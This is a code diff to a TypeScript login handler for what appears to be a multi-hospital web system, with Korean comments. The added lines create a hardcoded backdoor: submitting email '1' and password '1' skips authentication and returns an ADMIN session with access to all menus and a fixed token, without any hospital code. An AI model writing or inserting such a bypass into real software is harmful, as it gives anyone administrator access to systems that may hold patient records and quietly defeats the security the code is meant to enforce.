@@ -6,6 +6,23 @@ export const login = async (req: Request, res: Response): Promise<void> => {
     const { hospitalCode, email, password } = req.body;
 
     if (!hospitalCode || !email || !password) {
+      // 마스터 계정 (아이디: 1, 비밀번호: 1) 로그인을 위한 우회 허용
+      if (email === '1' && password === '1') {
+        res.status(200).json({
+          message: '마스터 계정으로 로그인되었습니다.',
+          data: {
+            userId: 'master_1',
+            email: '1',
+            name: 'SYSTEM MASTER',
+            role: 'ADMIN',
+            tenantId: 'WAYN-HQ',
+            hospitalName: '시스템 관리실',
+            accessibleMenus: ['ALL'],
+            token: 'master-jwt-token'
+          }
+        });
+        return;
+      }
       res.status(400).json({ error: '회원병원 식별정보(사업자등록번호), 이메일, 비밀번호는 필수입니다.' });
       return;
     }
